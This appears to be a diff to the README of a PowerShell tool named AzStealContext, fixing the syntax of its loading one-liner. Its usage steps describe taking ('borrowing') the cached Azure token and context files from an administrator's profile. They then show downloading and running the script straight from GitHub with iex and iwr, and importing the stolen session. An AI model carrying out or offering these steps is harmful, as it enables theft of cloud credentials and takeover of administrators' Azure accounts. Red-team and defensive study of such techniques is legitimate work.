@@ -10,7 +10,7 @@ The AzureRmContext file can have multiple 'contexts'. This happens if the `Conne
 ## Usage
 1. Find a Admin workstation / Userprofile that has the `.Azure` folder.
 2. 'Borrow' the `TokenCache.dat` and `AzureRmContext.json` files.
-3. Load this function. `iex(iwr https://raw.githubusercontent.com/justin-p/AzStealContext/master/Invoke-AzStealContext.ps1).content)`
+3. Load this function. `iex((iwr https://raw.githubusercontent.com/justin-p/AzStealContext/master/Invoke-AzStealContext.ps1).content)`
 4. Run the function
    - To prepair a AzContext file: `Invoke-AzStealContext -Path 'Path\To\Borrowed\Files'`
    - To prepair and Import a AzContext file: `Invoke-AzStealContext -Path 'Path\To\Borrowed\Files' -ImportContext`
